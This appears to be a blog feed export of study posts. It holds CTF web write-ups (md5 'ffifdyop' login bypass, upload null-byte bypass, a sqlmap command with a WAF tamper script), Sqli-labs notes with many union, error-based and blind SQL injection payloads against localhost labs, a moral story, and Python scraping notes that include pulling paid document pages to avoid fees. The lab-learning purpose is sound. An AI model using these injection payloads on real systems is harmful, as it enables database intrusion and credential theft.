class="line">print(str)</span><br></pre></td></tr></table></figure>
<h4 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h4><p><img src="https://ws4.sinaimg.cn/large/006tKfTcly1fpdpeazc6cj30ru03udgz.jpg" alt=""><br>对传入的captcha经过md5加密后取前4位，与session的验证码比较。所以就需要写个脚本逆向爆破一下。得到加密前的验证码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$i=1;</span><br><span class="line">	while (1)</span><br><span class="line">	&#123;</span><br><span class="line">		if(substr(md5($i),0,4)==&apos;dd35&apos;)</span><br><span class="line">		&#123;</span><br><span class="line">			echo $i;</span><br><span class="line">			break;</span><br><span class="line">		&#125;</span><br><span class="line">		$i++;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><br></p>
<p>然后就得到flag了。。。</p>
</the></excerpt>]]></content>
      
        <categories>
            
            <category> Study </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Summary </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Being grateful for what you have]]></title>
      <url>/2018/03/01/thanksgiving/</url>
      <content type="html"><![CDATA[<p><excerpt in="" index="" |="" 首页摘要="">赵某做生意发了财，花钱在郊区买了块地，修了栋三层的别墅，花园泳池很是气派，后院更有一株百年荔枝树，当初买地就是看中了这棵树，谁叫他老婆喜欢吃荔枝呢。</excerpt></p>
<p>装修期间，朋友劝他找个风水先生看看，以免犯煞。原本不怎么信这套的赵某，这次居然表示赞同，专程去香港请了个大师。<a id="more"></a></p>
<the rest="" of="" contents="" |="" 余下全文="">

<p>大师姓曹，从事这一行三十余年，圈内很有名气。</p>
<p>在市里吃过饭，赵某开车载着曹大师前往郊区。一路上，如果后头有车要超，赵某都是避让。</p>
<p>曹大师笑道：“赵老板开车挺稳当呢。”虽然是香港人，一口普通话还算流利。</p>
<p>赵某哈哈一笑：“要超车的多半有急事，可不能耽误他们。”</p>
<p>行至小镇，街道远比市内要狭窄，赵某放慢了车速。</p>
<p>一名小孩嬉笑着从巷子里冲了出来，赵某一脚刹车堪堪避开，小孩笑嘻嘻的跑过去以后，他并没有踩油门前行，而是看着巷子口，似乎在等着什么，片刻，又有一名小孩冲了出来，追赶着先前那名小孩远去。</p>
<p>曹大师讶然问，“你怎么知道后头还有小孩？”</p>
<p>赵某耸耸肩，“小孩子都是追追打打，光是一个人他可不会笑得这么开心。”</p>
<p>曹大师竖起了大拇指，笑道：“有心。”</p>
<p>到了别墅，刚下车，后院突然飞起七八只鸟，见状，赵某停在门口，抱歉的冲曹大师说道：“麻烦大师在门口等一会。”</p>
<p>“有什么事吗？”曹大师再次讶然。</p>
<p>“后院肯定有小孩在偷摘荔枝，我们现在进去，小孩自然惊慌，万一掉下来就不好了。”赵某笑着说道。</p>
<p>曹大师默然片刻，“你这房子的风水不用看了。”</p>
<p>这次轮到赵某讶然了，“大师何出此言？”</p>
<p>“有您在的地方，都是风水吉地。”目中有人，才有路，心中有爱，才有度。一个人的宽容，来自一颗善待他人的心。一个人的涵养，来自一颗尊重他人的心。一个人的修养，来自一颗和善的心。为别人付出就是给自己铺路。感恩一切！口中有德，目中有人，心中有爱，行中有善！只有知道感恩的人才能让自己的生活更有色彩！</p>
<p><br></p>
<p>文章来源于网络，如有侵权，请联系删除！</p>
</the>]]></content>
      
        <categories>
            
            <category> Life </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Meditation </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Python3 Web Spider Notes]]></title>
      <url>/2018/03/01/py3-spider/</url>
      <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要="">

<p>Some Python3 Crawler studying notes from blog in CSDN :)<a id="more"></a></p>
<the rest="" of="" contents="" |="" 余下全文="">

<p>根据 <a href="http://blog.csdn.net/c406495762/article/details/58716886" target="_blank" rel="noopener">Jack-Cui</a> Python3网络爬虫教程 <strong>实践总结出如下笔记</strong></p>
<p><br></p>
<h2 id="（一）利用urllib进行简单的网页抓取"><a href="#（一）利用urllib进行简单的网页抓取" class="headerlink" title="（一）利用urllib进行简单的网页抓取"></a>（一）利用urllib进行简单的网页抓取</h2><p><a href="https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/001432688314740a0aed473a39f47b09c8c7274c9ab6aee000/" target="_blank" rel="noopener">urllib</a></p>
<blockquote>
<p><strong>1</strong>.urllib.request模块是用来打开和读取URLs的；</p>
<p><strong>2</strong>.urllib.error模块包含一些有urllib.request产生的错误，可以使用try进行捕捉处理；</p>
<p><strong>3</strong>.urllib.parse模块包含了一些解析URLs的方法；</p>
<p><strong>4</strong>.urllib.robotparser模块用来解析robots.txt文本文件.它提供了一个单独的RobotFileParser类，通过该类提供的can_fetch()方法测试爬虫是否可以下载一个页面。</p>
<p><strong>5</strong>.<a href="https://docs.python.org/3.6/library/urllib.html" target="_blank" rel="noopener">urlopen各类参数</a></p>
</blockquote>
<p><a href="http://cn.python-requests.org/zh_CN/latest/user/quickstart.html" target="_blank" rel="noopener">requests模块</a></p>
<p><a href="https://pypi.python.org/pypi/chardet/" target="_blank" rel="noopener">chardet模块</a></p>
<p><strong>.read()</strong>方法可以读取返回的文本对象</p>
<p><strong>.decode()</strong> 可以转码</p>
<h2 id="二-：利用urllib-urlopen向有道翻译发送数据获得翻译结果"><a href="#二-：利用urllib-urlopen向有道翻译发送数据获得翻译结果" class="headerlink" title="(二)：利用urllib.urlopen向有道翻译发送数据获得翻译结果"></a>(二)：利用urllib.urlopen向有道翻译发送数据获得翻译结果</h2><p>geturl()返回的是一个url的字符串；</p>
<p>info()返回的是一些meta标记的元信息，包括一些服务器的信息；</p>
<p>getcode()返回的是HTTP的状态码，如果返回200表示请求成功。</p>
<p>但是好像现在有道翻译网页更新了之后。。好像爬不出来了～<img src="https://ws2.sinaimg.cn/large/006tNc79ly1foyvffocsej30bm01kglo.jpg" alt=""></p>
<h2 id="三-：urllib-error异常"><a href="#三-：urllib-error异常" class="headerlink" title="(三)：urllib.error异常"></a>(三)：urllib.error异常</h2><p>HTTPError和URLError一起捕获异常，那么需要将HTTPError放在URLError的前面，因为HTTPError是URLError的一个子类。如果URLError放在前面，出现HTTP异常会先响应URLError，这样HTTPError就捕获不到错误信息了。</p>
<p>这里发现一个有趣的现象，URL上是一个404页面，但是爬的时候没有加ua，所以httperror就变成了403了:)</p>
<h2 id="四-：使用User-Agent和代理IP隐藏身份"><a href="#四-：使用User-Agent和代理IP隐藏身份" class="headerlink" title="(四)：使用User Agent和代理IP隐藏身份"></a>(四)：使用User Agent和代理IP隐藏身份</h2><h3 id="User-Agent"><a href="#User-Agent" class="headerlink" title="User Agent"></a>User Agent</h3><p>两种方法加UA，注意headers参数要求为<strong>字典</strong></p>
<ol>
<li>在创建Request对象的时候就传入headers参数</li>
<li>创建之后用 <strong>.add.header()</strong> 方法添加</li>
</ol>
<h3 id="IP代理"><a href="#IP代理" class="headerlink" title="IP代理"></a>IP代理</h3><p>捣鼓来捣鼓去，都是出现error～</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.client.RemoteDisconnected: Remote end closed connection without response</span><br></pre></td></tr></table></figure>
<p>然后后来发现，是代理ip的问题，换了个ip之后出现了504～</p>
<p>结果成功没报错之后，没有print的值～这就…… </p>
<h2 id="五-：Python3安装Scrapy"><a href="#五-：Python3安装Scrapy" class="headerlink" title="(五)：Python3安装Scrapy"></a>(五)：Python3安装Scrapy</h2><p>自动跳过～因为我已经装了:)</p>
<h2 id="六-：Python3使用Cookie-模拟登陆获取妹子联系方式"><a href="#六-：Python3使用Cookie-模拟登陆获取妹子联系方式" class="headerlink" title="(六)：Python3使用Cookie-模拟登陆获取妹子联系方式"></a>(六)：Python3使用Cookie-模拟登陆获取妹子联系方式</h2><p>这个网站已经关闭注册了，所以，理解代码思路就ok！</p>
<h3 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h3><h4 id="将cookie保存到变量中"><a href="#将cookie保存到变量中" class="headerlink" title="将cookie保存到变量中"></a>将cookie保存到变量中</h4><p>利用CookieJar对象实现获取cookie的功能，存储到变量中</p>
<h4 id="保存cookie到文件中"><a href="#保存cookie到文件中" class="headerlink" title="保存cookie到文件中"></a>保存cookie到文件中</h4><p>使用MozillaCookieJar来实现Cookie的保存</p>
<blockquote>
<p>cookie.save的参数说明：</p>
<ul>
<li>ignore_discard的意思是即使cookies将被丢弃也将它保存下来；</li>
<li>ignore_expires的意思是如果在该文件中cookies已经存在，则覆盖原文件写入。</li>
</ul>
</blockquote>
<h4 id="从文件中获取cookie"><a href="#从文件中获取cookie" class="headerlink" title="从文件中获取cookie"></a>从文件中获取cookie</h4><blockquote>
<p>cookie.load就是从文件中获取cookie，其余参数不变</p>
</blockquote>
<h2 id="七-：使用Beautiful-Soup爬取小说"><a href="#七-：使用Beautiful-Soup爬取小说" class="headerlink" title="(七)：使用Beautiful Soup爬取小说"></a>(七)：使用Beautiful Soup爬取小说</h2><p><a href="http://beautifulsoup.readthedocs.io/zh_CN/latest/" target="_blank" rel="noopener">Beautiful Soup</a></p>
<p>这是个利器啊～～！</p>
<p>手敲代码，果然会手误啊！敲了半天，逻辑没错。。检查了半天才发现～～打少了个字母，然后就报错了！<img src="https://ws2.sinaimg.cn/large/006tNc79ly1fozql04lbwj30ze02mt8z.jpg" alt=""></p>
<p>纠正回来，然后就顺利爬到各章节的页面<img src="https://ws3.sinaimg.cn/large/006tNc79ly1fozqljteeij30dk05uq49.jpg" alt=""></p>
<p>成功爬取整本小说的内容。。。瞬间感觉成就感爆棚～～哈哈哈哈！让我捋一捋思路，简化一下代码先～～</p>
<p>Maybe 多线程？</p>
<h2 id="八-：爱奇艺等主流视频网站的VIP视频破解-在线观看-视频下载"><a href="#八-：爱奇艺等主流视频网站的VIP视频破解-在线观看-视频下载" class="headerlink" title="(八)：爱奇艺等主流视频网站的VIP视频破解(在线观看+视频下载)"></a>(八)：爱奇艺等主流视频网站的VIP视频破解(在线观看+视频下载)</h2><p>这个暂时先放一放～</p>
<h2 id="九-：使用Selenium爬取百度文库word文章"><a href="#九-：使用Selenium爬取百度文库word文章" class="headerlink" title="(九)：使用Selenium爬取百度文库word文章"></a>(九)：使用Selenium爬取百度文库word文章</h2><p><a href="https://www.jianshu.com/p/e137031bc7db" target="_blank" rel="noopener">Mac OS环境配置chromedriver</a></p>
<p>发现百度文库排版设计发生了变化～没那么好用xpath定位了，然后我就在豆丁上审计了一下元素，发现好像可以～～豆丁上的页面排版跟旧版百度文库好像。。。没什么区别～除了名字不一样之外～～难道？？:)</p>
<p>这一节卡了我好久，用到了前面用过的BeautifulSoup和还没完全搞懂的re～～</p>
<p>总结来说就是多次用BeautifulSoup来筛选内容，然后用Selenium来定位元素，通过selenium和jsp脚本，翻页，根据每5页内容放在一个页面内，然后用一个表达式判断啥时候到尾，结束循环，爬完～如果再利用写入文件，就可以把爬去的内容导出，然后就可以～～免去一笔费用啦！！</p>
<p>实际操作的时候，发现不少坑，python的简单，让锁进变得更严谨，有时候自己根本看不出来是锁进的问题。。但他确确实实就是锁进的问题。。一次次的调试，让我渐渐明白selenum的原理。。可以自动翻页，但是。。。爬取的内容还是前5页的～后来发现循环那里没有重新爬页面。。调整之后就可以实现爬整篇文章了，但是想写入文件。。对于 write 方法我还没掌握好，所以又要研究一会儿.</p>
<p>Bingo～<img src="https://ws3.sinaimg.cn/large/006tNc79ly1fp8mxbqlhrj30zk0mwwg5.jpg" alt=""></p>
<p>但是对于打印进度的 sys 模块还没完全搞清楚如何弄，再看看官方文档先～</p>
<h2 id="十-：这个帅哥、肌肉男横行的世界（爬取帅哥图）"><a href="#十-：这个帅哥、肌肉男横行的世界（爬取帅哥图）" class="headerlink" title="(十)：这个帅哥、肌肉男横行的世界（爬取帅哥图）"></a>(十)：这个帅哥、肌肉男横行的世界（爬取帅哥图）</h2><p><a href="http://docs.python-requests.org/zh_CN/latest/user/quickstart.html" target="_blank" rel="noopener">requests库</a></p>
</the></excerpt>]]></content>
      
        <categories>
            
            <category> Study </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Summary </tag>
            
            <tag> Notes </tag>
            
            <tag> Python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CTF in ShiYanBa]]></title>
      <url>/2018/02/19/ctf-syb/</url>
      <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要="">

<p>拿点CTF练练手，美滋滋～<a id="more"></a></p>
<the rest="" of="" contents="" |="" 余下全文="">

<h3 id="简单的登陆题"><a href="#简单的登陆题" class="headerlink" title="简单的登陆题"></a>简单的登陆题</h3><p>这一题有点难度，卡住了～～</p>
<h3 id="后台登陆"><a href="#后台登陆" class="headerlink" title="后台登陆"></a>后台登陆</h3><p>查看源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- $password=$_POST[<span class="string">'password'</span>];</span><br><span class="line">	$sql = <span class="string">"SELECT * FROM admin WHERE username = 'admin' and password = '"</span>.md5($password,<span class="keyword">true</span>).<span class="string">"'"</span>;</span><br><span class="line">	$result=mysqli_query($link,$sql);</span><br><span class="line">		<span class="keyword">if</span>(mysqli_num_rows($result)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'flag is :'</span>.$flag;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'密码错误!'</span>;</span><br><span class="line">		&#125; --&gt;</span><br></pre></td></tr></table></figure>
<p>注入题是肯定的。。但是经过了md5加密，然后就去网上搜了一波关于md5的注入。。然后就发现了一个神奇的字符串：<strong>ffifdyop</strong>竟然发现。。。跟这道题的php文件是同一个名字，仿佛明白了什么之后，就去试了试提交。。结果flag就出来了。。</p>
<p>原理：</p>
<p>与SQL注入原理相同，只是需要用爆破md5来求出字符串</p>
<p>当我们苦心孤诣的想，什么字符串经过md5加密后又可以转换成我们想要的注入字符串时，已经有大牛用脚本爆破出一个“万能”flag了。。</p>
<h3 id="加了料的报错注入"><a href="#加了料的报错注入" class="headerlink" title="加了料的报错注入"></a>加了料的报错注入</h3><p>这里过滤了# = </p>
<h3 id="PHP大法"><a href="#PHP大法" class="headerlink" title="PHP大法"></a>PHP大法</h3><p><a href="http://ctf5.shiyanbar.com/DUTCTF/index.php" target="_blank" rel="noopener">解题链接</a></p>
<p>关键代码：<img src="https://ws1.sinaimg.cn/large/006tNc79gy1fom1wi623zj30js07uq2z.jpg" alt=""></p>
<p>将hackerDJ url编码之后发现，还是not allowed 。就重新捋了一遍逻辑，发现浏览器url栏上会url解码一次，所以需要将hackerDJ二次url编码，再get进去就得到flag了。</p>
<h3 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h3><p><a href="http://www.shiyanbar.com/ctf/1781" target="_blank" rel="noopener">解题链接</a></p>
<p>一看到上传绕过就想到了00截断</p>
<p>首先尝试上传php文件，然后发现要上传图片，然后又试了试上传图片，发现成功上传，但是又要求php后缀才行。。于是就觉得是在前端判断是否是图片后缀，然后再判断上传到目录中的文件是否是php来get flag。所以就在burp里改了file name，再改了hex，然后就OK了。</p>
<h3 id="简单的SQL注入"><a href="#简单的SQL注入" class="headerlink" title="简单的SQL注入"></a>简单的SQL注入</h3><p><a href="http://www.shiyanbar.com/ctf/1875" target="_blank" rel="noopener">解题链接</a></p>
<p>这个真是“简单”啊。一下子过滤了那么多～～～不过也get也一波绕过waf新方法。。但是，只要把绕过找出来。。藏flag的地方的确很。。。</p>
<p>用sqlmap跑，再用上一个绕waf脚本，ok！</p>
<p><a href="http://www.cnblogs.com/r00tgrok/p/SQL_Injection_Bypassing_WAF_And_Evasion_Of_Filter.html" target="_blank" rel="noopener">深入理解SQL注入绕过WAF和过滤机制</a></p>
<h3 id="简单的SQL注入2"><a href="#简单的SQL注入2" class="headerlink" title="简单的SQL注入2"></a>简单的SQL注入2</h3><p><a href="http://ctf5.shiyanbar.com/web/index_2.php" target="_blank" rel="noopener">解题链接</a></p>
<p>解题思路一样</p>
<p>sqlmap -u “<a href="http://ctf5.shiyanbar.com/web/index_2.php/?id=1" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/index_2.php/?id=1</a>“ –dump -C flag -T flag -D web1 –tamper=”space2comment.py” –level=3</p>
<h3 id="简单的SQL注入3"><a href="#简单的SQL注入3" class="headerlink" title="简单的SQL注入3"></a>简单的SQL注入3</h3><p>连flag都一样的～如果用sqlmap跑这三道题，简直是送分，当然，如果手注的话，还是会发现细微的区别的！</p>
</the></excerpt>]]></content>
      
        <categories>
            
            <category> Study </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Summary </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[SQL Injection - Sqli-labs]]></title>
      <url>/2018/02/05/sqlinjection-sqlilabs/</url>
      <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要="">

<p>边学边记，Sqli-labs<a id="more"></a></p>
<the rest="" of="" contents="" |="" 余下全文="">

<h2 id="Sqli-labs"><a href="#Sqli-labs" class="headerlink" title="Sqli-labs"></a>Sqli-labs</h2><h3 id="less-1-GET-Error-based-Single-quotes-String"><a href="#less-1-GET-Error-based-Single-quotes-String" class="headerlink" title="less-1 GET - Error based - Single quotes - String"></a>less-1 GET - Error based - Single quotes - String</h3><p>(基于错误的GET单引号字符型注入)</p>
<h4 id="查询（union）"><a href="#查询（union）" class="headerlink" title="查询（union）"></a>查询（union）</h4><p>当函数mysql_fetch_array只被调用了一次时，且想显示非第一行查询的数据库数据时，可以让第一行的查询结果为空，那么，非第一行（union右边）的查询结果自然就成了第一行。</p>
<p><strong>union的作用是将两个sql语句进行联合。union前后的两个sql语句的选择列数要相同才可以（用order by查询行数） 。Union all与union 的区别是增加了去重的功能</strong></p>
<h4 id="数据库连接函数"><a href="#数据库连接函数" class="headerlink" title="数据库连接函数"></a>数据库连接函数</h4><p>concat和concat_ws</p>
<p>其中concat_ws的第一个参数是连接字符串的分隔符，还会用到group__concat(可以把查询出来的多行连接起来)</p>
<p>常用：concat_ws(char(32,58,32),user(),database(),version())</p>
<h4 id="查表"><a href="#查表" class="headerlink" title="查表"></a>查表</h4><p>查询information_schema中的信息时，使用where语句，那个值不能直接用英文，要用单引号包裹着，当然用其十六进制表示也可以，数值类型的就不用单引号了</p>
<h4 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h4><p>查表时也只能返回一个table，所以要用limit来控制结果集具体是哪一行</p>
<h4 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h4><p>Payload:<a href="http://localhost/sqli-labs/Less-1/index.php/?id=0&#39;union" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-1/index.php/?id=0&#39;union</a> select 1,2,3 –+</p>
<p>爆库：<a href="http://localhost/sqli-labs/Less-1/index.php/?id=0&#39;union" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-1/index.php/?id=0&#39;union</a> select 1,group_concat(schema_name),3 from information_schema.schemata–+</p>
<p>爆表：<a href="http://localhost/sqli-labs/Less-1/index.php/?id=0&#39;union" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-1/index.php/?id=0&#39;union</a> select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’security’–+</p>
<p>爆列：<a href="http://localhost/sqli-labs/Less-1/index.php/?id=0&#39;union" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-1/index.php/?id=0&#39;union</a> select 1,group_concat(column_name),3 from information_schema.columns where table_name=’users’–+</p>
<p>爆数据：<a href="http://localhost/sqli-labs/Less-1/index.php/?id=0&#39;union" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-1/index.php/?id=0&#39;union</a> select 1,username,password from users where id =3–+</p>
<h3 id="less-2-GET-Error-based-Intiger-based"><a href="#less-2-GET-Error-based-Intiger-based" class="headerlink" title="less-2 GET - Error based - Intiger based"></a>less-2 GET - Error based - Intiger based</h3><p> (基于错误的GET整型注入)</p>
<p>跟less1一样，只是不用闭合‘</p>
<h4 id="solution-1"><a href="#solution-1" class="headerlink" title="solution"></a>solution</h4><p>Payload:<a href="http://localhost/sqli-labs/Less-2/index.php/?id=1" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-2/index.php/?id=1</a> –+</p>
<p>or</p>
<p><a href="http://localhost/sqli-labs/Less-2/index.php/?id=1" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-2/index.php/?id=1</a> or 1=1</p>
<p><a href="http://localhost/sqli-labs/Less-2/index.php/?id=1" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-2/index.php/?id=1</a> or 1=1–+</p>
<h3 id="less-3-GET-Error-based-Single-quotes-with-twist-string"><a href="#less-3-GET-Error-based-Single-quotes-with-twist-string" class="headerlink" title="less-3 GET - Error based - Single quotes with twist string"></a>less-3 GET - Error based - Single quotes with twist string</h3><p>(基于错误的GET单引号变形字符型注入)</p>
<p>多了 <strong>‘)</strong> 那么sql语句里的id 应该就是 (‘$id’) 这样！</p>
<h4 id="solution-2"><a href="#solution-2" class="headerlink" title="solution"></a>solution</h4><p>Payload:<a href="http://localhost/sqli-labs/Less-3/index.php/?id=1′" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-3/index.php/?id=1′</a>) –+</p>
<p>or</p>
<p><a href="http://localhost/sqli-labs/Less-3/index.php/?id=1" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-3/index.php/?id=1</a>‘) or ‘1’=(‘1’</p>
<p><a href="http://localhost/sqli-labs/Less-3/index.php/?id=1′" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-3/index.php/?id=1′</a>) –+</p>
<h3 id="less-4-GET-Error-based-Double-Quotes-String"><a href="#less-4-GET-Error-based-Double-Quotes-String" class="headerlink" title="less-4 GET - Error based - Double Quotes - String"></a>less-4 GET - Error based - Double Quotes - String</h3><p>(基于错误的GET双引号字符型注入) </p>
<p>php中双引号可以包含单引号，所以判断是否存在注入时，还需要用 <strong>“</strong> 来判断</p>
<h4 id="solution-3"><a href="#solution-3" class="headerlink" title="solution"></a>solution</h4><p>Payload:<a href="http://localhost/sqli-labs/Less-4/index.php/?id=1" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-4/index.php/?id=1</a>“) –+</p>
<p>or</p>
<p><a href="http://localhost/sqli-labs/Less-4/index.php/?id=1" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-4/index.php/?id=1</a>“) or “1”=(“1</p>
<h3 id="less-5-GET-Double-Injection-Single-Quotes-String"><a href="#less-5-GET-Double-Injection-Single-Quotes-String" class="headerlink" title="less-5 GET - Double Injection - Single Quotes - String"></a>less-5 GET - Double Injection - Single Quotes - String</h3><p>(双注入GET单引号字符型注入)</p>
<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p><strong>count(*)</strong></p>
<p><a href="http://localhost/sqli-labs/Less-5/index.php/" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-5/index.php/</a><br>?id=1’ union Select 1,count(<em>),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)\</em>2))a from information_schema.columns group by a–+</p>
<p><strong>exp</strong></p>
<p>数据类型超出范围进行报错注入</p>
<p><strong>bigint</strong></p>
<p>bigint溢出进行报错注入</p>
<p><strong>xpath</strong></p>
<p>xpath函数报错注入</p>
<p><a href="http://localhost/sqli-labs/Less-5/index.php/" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-5/index.php/</a><br>?id=1’ and extractvalue(1,concat(0x7e,(select @@version),0x7e))–+</p>
<p><strong>利用数据的重复性</strong></p>
<p><a href="http://localhost/sqli-labs/Less-5/index.php/" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-5/index.php/</a><br>?id=1’union select 1,2,3 from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x –+</p>
<h4 id="solution-4"><a href="#solution-4" class="headerlink" title="solution"></a>solution</h4><p>payload：</p>
<p>布尔注入：</p>
<p>报错注入：</p>
<p><a href="http://localhost/sqli/Less-5/?id=1" target="_blank" rel="noopener">http://localhost/sqli/Less-5/?id=1</a>‘ and (select 1 from(select count(<em>*),concat(char(32,58,32),(select concat_ws(char(32,58,32),id,username,password) from users limit 0,1),char(32,58,32),floor(rand()</em> *2))name from information_schema.tables group by name)b) –+</p>
<p>延时注入：</p>
<p><a href="http://localhost/sqli-labs/Less-5/index.php/?id=1&#39;and" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-5/index.php/?id=1&#39;and</a> If(ascii(substr(database(),1,1))=115,1,sleep(5))–+ </p>
<p><a href="http://localhost/sqli-labs/Less-5/index.php/" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-5/index.php/</a><br>?id=1’UNION SELECT (IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,ENCODE(‘MSG’,’by 5 seconds’)),null)),2,3 FROM (select database() as current) as tb1–+</p>
<h3 id="less-6-GET-Double-Injection-Double-Quotes-String"><a href="#less-6-GET-Double-Injection-Double-Quotes-String" class="headerlink" title="less-6 GET - Double Injection - Double Quotes - String"></a>less-6 GET - Double Injection - Double Quotes - String</h3><p>(双注入GET双引号字符型注入)</p>
<p>payload跟less-5异曲同工，只是把 ‘ 改成 “ </p>
<h3 id="less-7-GET-Dump-into-outfile-String"><a href="#less-7-GET-Dump-into-outfile-String" class="headerlink" title="less-7 GET - Dump into outfile - String"></a>less-7 GET - Dump into outfile - String</h3><p>(导出文件GET字符型注入)</p>
<p>@@datadir 读取数据库路径<br>@@basedir MYSQL 获取安装路径</p>
<p>outfile函数将数据库中的内容写到一个文件中</p>
<p>dumpfile只能使用一行</p>
<p>load_file函数用来从文件系统中将文件导入到mysql中</p>
<p>虽然有相应数据库权限，也对路径进行了转义，但是还是没有成功导出文件，尝试导出在tmp文件夹，发现也不行。先放着吧！</p>
<p><a href="http://localhost/sqli-labs/Less-7/index.php/?id=1" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-7/index.php/?id=1</a>‘)) union select 1,2,3 into outfile “C:\phpStudy\tmp\1.php” %23 </p>
<h3 id="less-8-GET-Blind-Boolian-Based-Single-Quotes"><a href="#less-8-GET-Blind-Boolian-Based-Single-Quotes" class="headerlink" title="less-8 GET - Blind - Boolian Based - Single Quotes"></a>less-8 GET - Blind - Boolian Based - Single Quotes</h3><p>(布尔型单引号GET盲注)</p>
<p>这一关把mysql报错的语句注释了，所以就不能用报错注入了。</p>
<h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p><strong>left()</strong></p>
<p>left()得到字符串左部指定个数的字符    </p>
<p>left ( string, n )        string为要截取的字符串，n为长度。</p>
<p>正确时返回 “You are in 。。。。“ 否则则无回显。</p>
<p><strong>length()</strong></p>
<p>测试数据库长度</p>
<p><strong>substr()与ascii()并用 </strong></p>
<p>substr()和substring()函数实现的功能是一样的，均为截取字符串。</p>
<p>​    string substring(string, start, length)</p>
<p>​    string substr(string, start, length)</p>
<p>获取security数据库的第一个表(limit 0,1)的字符</p>
<p>获取该数据库的第二个表 limit 1,1</p>
<p><strong>regexp</strong></p>
<p>利用regexp获取（2）中users表中的列</p>
<p>I    select * from users where id=1 and 1=(if((user() regexp ‘^r’),1,0));</p>
<p>II    select * from users where id=1 and 1=(user() regexp’^ri’);</p>
<p>通过if语句的条件判断，返回一些条件句，比如if等构造一个判断。根据返回结果是否等于0或者1进行判断。</p>
<p>III    select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema=’security’ and table_name regexp ‘^us[a-z]’ limit 0,1);</p>
<p>这里利用select构造了一个判断语句。我们只需要更换regexp表达式即可</p>
<p>‘^u[a-z]’ -&gt; ‘^us[a-z]’ -&gt; ‘^use[a-z]’ -&gt; ‘^user[a-z]’ -&gt; FALSE</p>
<p><a href="http://www.cnblogs.com/lcamry/articles/5717442.html" target="_blank" rel="noopener">SQL盲注之正则表达式攻击</a></p>
<p><strong>ord() 和 mid(column_name,start[,length])</strong></p>
<p>利用 ord()（此函数为返回第一个字符的ASCII码） 和 mid() 函数获取users表的内容</p>
<p>例如ORD(MID(DATABASE(),1,1))&gt;114 意为检测database()的第一位ASCII码是否大于114，也即是‘r’</p>
<h3 id="less-9-GET-Blind-Time-based-Single-Quotes"><a href="#less-9-GET-Blind-Time-based-Single-Quotes" class="headerlink" title="less-9 GET - Blind - Time based. -  Single Quotes"></a>less-9 GET - Blind - Time based. -  Single Quotes</h3><p> (基于时间的GET单引号盲注)</p>
<h4 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h4><p><strong>sleep()</strong></p>
<p>利用sleep()函数进行注入</p>
<p><a href="http://localhost/sqli-labs/Less-9/index.php/" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-9/index.php/</a><br>?id=1’and If(ascii(substr(database(),1,1))=115,1,sleep(5))–+</p>
<p><strong>BENCHMARK()</strong></p>
